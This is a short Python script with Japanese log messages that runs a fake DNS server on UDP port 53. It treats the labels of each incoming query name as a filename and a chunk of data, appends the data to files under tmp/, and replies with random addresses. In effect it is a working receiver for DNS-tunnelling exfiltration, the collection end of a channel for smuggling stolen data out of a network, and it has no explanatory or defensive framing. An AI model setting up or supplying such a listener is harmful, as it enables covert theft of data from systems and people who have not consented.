#!/usr/bin/env python
from scapy.all import *
import socket
import random

UDP_PORT = 53

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind(('0.0.0.0', UDP_PORT))

print(f"UDPポート{UDP_PORT}でリッスンを開始しました。")

while True:
    raw_data, addr = sock.recvfrom(1024)

    try:
        query = DNS(raw_data)

        if query.qr == 0 and query.qd:
          qname = query.qd.qname.decode()
          data_parts = qname.split('.')
          filename = data_parts[0]
          data = data_parts[1]
          print(f"{filename} : {data}")

          with open(f"tmp/{filename}", 'a') as file:
            file.write(data)

          response = DNS(id=query.id, 
            qr=1, 
            aa=1, 
            qd=query.qd, 
            an=DNSRR(
              rrname=qname, 
              ttl=10, 
              rdata=f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
            )
          )
          sock.sendto(bytes(response), addr)

        else:
          print(f"Query Error: {query}")

    except Exception as e:
      print(f"Packet Error: {e}")
